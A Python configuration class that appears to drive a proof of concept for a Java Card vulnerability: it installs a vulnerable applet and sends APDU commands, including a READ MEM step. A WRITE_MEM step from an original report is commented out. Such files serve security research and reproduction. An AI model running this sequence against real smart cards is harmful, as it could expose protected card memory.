class Stages:
    STAGES = [
        {
            "name": "install",
            "path": "build/{version}/com/se/vulns/javacard/vulns.new.cap",
            "comment": "",
        },
        {
            "name": "install",
            "path": "build/{version}/com/se/applets/javacard/applets.cap",
        },
        {
            "name": "send",
            "comment": "PING",
            "payload": "0x80 0x10 0x01 0x02	0x02	0x00 0x00		0x7F",
            "optional": False,
        },
        {
            "name": "send",
            "comment": "STATUS",
            "payload": "0x80 0x11 0x01 0x02	0x02	0x00 0x00		0x7F",
            "optional": True,
        },
        {
            "name": "send",
            "comment": "SETUP",
            "payload": "0x80 0x12 0x01 0x02	0x02	0x00 0x00		0x7F",
            "optional": True,
        },
        {
            "name": "send",
            "comment": "READ MEM",
            "payload": "0x80 0x13 0x01 0x02	0x03	0x00 0x00 0xc0		0x7F",
            "optional": True,
        },
        # The following instruction is mentioned in the original report, but not
        # used in the POC.
        # {
        #     "name": "send",
        #     "comment": "WRITE_MEM APDU",
        #     "payload": "0x80 0x14 0x01 0x02	0x03	0x00 0x00 0xc0		0x7F",
        #     "optional": True,
        # },
        {
            "name": "send",
            "comment": "CLEANUP",
            "payload": "0x80 0x15 0x01 0x02	0x02	0x00 0x00		0x7F",
            "optional": True,
        },
    ]
